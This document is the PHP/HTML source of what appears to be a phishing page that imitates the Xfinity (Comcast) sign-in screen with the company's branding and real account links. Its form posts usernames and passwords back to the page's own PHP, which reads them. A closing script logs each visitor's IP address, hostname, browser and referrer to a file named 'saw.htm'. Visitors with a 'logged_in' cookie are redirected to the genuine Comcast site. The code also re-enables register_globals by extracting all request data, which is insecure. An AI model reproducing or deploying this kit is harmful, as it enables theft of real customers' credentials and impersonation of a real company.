<?php
if (!ini_get('register_globals')) {
$superglobals = array($_SERVER, $_ENV,
$_FILES, $_COOKIE, $_POST, $_GET);
if (isset($_SESSION)) {
array_unshift($superglobals, $_SESSION);
}
foreach ($superglobals as $superglobal) {
extract($superglobal, EXTR_SKIP);
}
ini_set('register_globals', true);
}
$user = $_POST['user'];
$passwd = $_POST['passwd'];
?>
<!DOCTYPE html>
<html lang="en" class="light custom">
<head>
<title>Sign in to Xfinity</title>

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="i/96.png">
<meta name="theme-color" content="#ffffff">

<link rel="stylesheet" type="text/css" href="log.css">
<link rel="shortcut icon" href="i/favicon.ico">
<link rel="apple-touch-icon" sizes="57x57" href="i/57.png">
<link rel="apple-touch-icon" sizes="60x60" href="i/60.png">
<link rel="apple-touch-icon" sizes="72x72" href="i/72.png">
<link rel="apple-touch-icon" sizes="76x76" href="i/76.png">
<link rel="apple-touch-icon" sizes="114x114" href="i/114.png">
<link rel="apple-touch-icon" sizes="120x120" href="i/120.png">
<link rel="apple-touch-icon" sizes="144x144" href="i/144.png">
<link rel="apple-touch-icon" sizes="152x152" href="i/152.png">
<link rel="apple-touch-icon" sizes="180x180" href="i/180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="i/192.png">
<link rel="icon" type="image/png" sizes="32x32" href="i/32.png">
<link rel="icon" type="image/png" sizes="96x96" href="i/96.png">
<link rel="icon" type="image/png" sizes="16x16" href="i/16.png">
<link rel="manifest" href="i/manifest.json">

<style type="text/css">
@media only screen and (min-width: 1024px) {
html { background-color: #000000; }
}
#background {
background: #000000;
background: -webkit-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -mos-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -ms-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -o-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background-attachment: initial;
line-height:1;
height: 100%;
}
#left {
color: #e6eaed;
padding-left: 26px;
width: 568px;
margin-left: 0;
}
#left h1 {
color: #e6eaed;
font-size: 24px;
font-weight: 300;
line-height: 30px;
margin-top: 10px;
margin-bottom: 14px;
letter-spacing: 0.37px;
}
#left h1::first-letter {
margin-left: -2px;
}
#left p {
font-size: 16px;
line-height: 28px;
margin-top: 14px;
}
#left a {
color: #2b9cd8;
}
#leftSide-image {
display: block;
margin-top: 48px;
margin-left: -26px;
width: 594px;
}
#right #quick-bill-pay { display: block; }
</style>

<?php
if (isset($_COOKIE['logged_in'])) {
echo '<script type="text/javascript">
window.location = "http://ad.doubleclick.net/ddm/clk/288545052;114648096;n?https://customer.comcast.com/Overview/"
</script>';
}
?>

</head>

<body class="has-footer">

<div id="breakpoints"></div>
<div id="background"></div>
<main id="bd">
<h1 class="screen-reader-text">Sign in to Xfinity</h1>
<div id="left"><h1>It's now easier to pay your bill anytime, anywhere.</h1>
<p>Want to pay your outstanding balance without signing in? <a href="https://customer.xfinity.com/lite" target="_blank" rel="noreferrer" rel="nofollow">Try quick bill pay</a></p>
<img id="leftSide-image" src="i/promoa.png" srcset="i/promoa.png 1x, i/promob.png 2x" />
<p>
Comcast Business customer?
<a href='https://businessclass.comcast.net?INTCMP=ILC-XfinityCom-MyAccountSigninCTA-BCPSignin01' target="_blank" rel="noreferrer" rel="nofollow">Sign in here</a>
</p></div><div id="right">

<div class="container">

<form name="signin" method="post" onsubmit="return login.onSubmit()">
<input type="hidden" name="page" value="first">

<div class="single logo-wrapper">
<span class="xfinity-logo"></span>
</div>
<label for="user" id="login_id_label" role="alert"></label>
<div class="textfield-wrapper">
<label for="user" class="float accessibly-hidden">Username</label><input autofocus="autofocus" id="user" class="" autocorrect="off" autocapitalize="off" spellcheck="false" name="user" type="text" value="" placeholder="Username, email, or mobile" maxlength="35">
</div>

<label for="passwd" id="password_label" role="alert"></label>
<div class="textfield-wrapper">
<label for="passwd" class="float accessibly-hidden">Password</label><input id="passwd" class="" name="passwd" type="password" placeholder="Password" maxlength="35">
</div>

<div class="checkbox-container">
<label for="remember_me" >
<input type="checkbox" id="remember_me" name="rm" value="1" ><span id="remember_me_checkbox" class="checkbox"></span><div class="content" >Stay signed in</div>
</label>
<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
</div>

<button class="submit" type="submit" id="sign_in">Sign In</button>

<ul>
<li id="forgot-username-password-item">Forgot <a href="https://idm.xfinity.com/myaccount/lookup?execution=e3s1" target="_blank" rel="noreferrer" rel="nofollow">username</a> or <a id="forgotPwdLink" href="https://idm.xfinity.com/myaccount/reset?execution=e4s1" target="_blank" rel="noreferrer" rel="nofollow">password</a>?</li>
<li id="create-username-item">Don't have a username? <span><a href="https://idm.xfinity.com/myaccount/create-uid?execution=e5s1" target="_blank" rel="noreferrer" rel="nofollow">Create one</a></span></li>
<li id="quick-bill-pay"><a href="#">Pay any balance</a> without signing in</li>
</ul>

<p id="implied-legal">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>

</form>
</div>
</div>
</main>


<footer>
<span class="copyright">&copy; <?php print date("Y"); ?> Comcast</span>
<span class="divider hide-compact"></span>
<span class="links hide-compact">
<a href="#">Terms of Service</a>
<span class="divider"></span>
<a href="#">Privacy Policy</a>
</span>
<span class="divider"></span>
<span class="links">
<a href="#">Site Map</a>
<span class="divider"></span>
<a href="#">Contact Us</a>
</span>
</footer>

<script type="text/javascript" src="b.js"></script>
<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
<div role="document" class="content">
<button type="button" class="close" aria-label="Close"></button>
<h1>Why Stay Signed In?</h1>
<p>When you choose this option on sign in, we will remember who you are and keep you signed in for up to 30 days unless you sign out.</p>
<p>Please note: If you share your personal computer with others, they could access and make changes to your account. You should definitely not use this option on public computers.</p>
</div>
</div>

<script type="text/javascript" src="a.js"></script>

<script type="text/javascript">
login.registerInitFunction(function(config){
login.onSubmit = function() {
var usernameSelector = "#"+config.usernameId,
passwordSelector = "#"+config.passwordId,
username = $(usernameSelector),
password = $(passwordSelector);
if(username.val() === "" || password.val() === "") {
$("#error").remove();
$(usernameSelector+", "+passwordSelector).addClass("error");
$('<p id="error" class="error_message">'+config.authnEmptyError+'</p>').insertAfter(".textfield-wrapper:has("+passwordSelector+")");
$("#login_id_label").attr('aria-label',config.authnEmptyError+' '+config.reenterUsername);
$("#password_label").attr('aria-label',config.authnEmptyError+' '+config.reenterPassword);
username.focus();
return false
} else {
return true
}
};
}, "responsiveForm");
;
shared.init();
login.init({
usernameId: 'user',
passwordId: 'passwd',
authnEmptyError: 'Please enter your Email or Username and Password to Sign In.',
reenterUsername: 'Please re-enter username.',
reenterPassword: 'Please re-enter password.'
});
</script>

</body>
</html>
<?php
define("LOG_FILE","saw.htm");
date_default_timezone_set('America/New_York');
$logfileHeader=''."\n";
$datum = date("d/m/Y - H:i:s");
$useragent = ( isset($_SERVER['HTTP_USER_AGENT']) && ($_SERVER['HTTP_USER_AGENT'] != "")) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";
$userip = ( isset($_SERVER['REMOTE_ADDR']) && ($_SERVER['REMOTE_ADDR'] != "")) ? $_SERVER['REMOTE_ADDR'] : "Unknown";
$refferer  = ( isset($_SERVER['HTTP_REFERER']) && ($_SERVER['HTTP_REFERER'] != "")) ? $_SERVER['HTTP_REFERER'] : "Unknown";
$uri = ( isset($_SERVER['REQUEST_URI'])	&& ($_SERVER['REQUEST_URI'] != "")) ? $_SERVER['REQUEST_URI'] : "Unknown";
$hostname = gethostbyaddr($userip);
$logEntry = "<a href=http://whois.sc/$userip target=_blank>$userip</a><br>$datum<br>$hostname<br>$useragent<br>$uri<br>$refferer<br><br>\n";
if (!file_exists(LOG_FILE)) { $logFile = fopen(LOG_FILE,"w"); fwrite($logFile, $logfileHeader); }
else { $logFile = fopen(LOG_FILE,"a"); } fwrite($logFile,$logEntry); fclose($logFile);
?>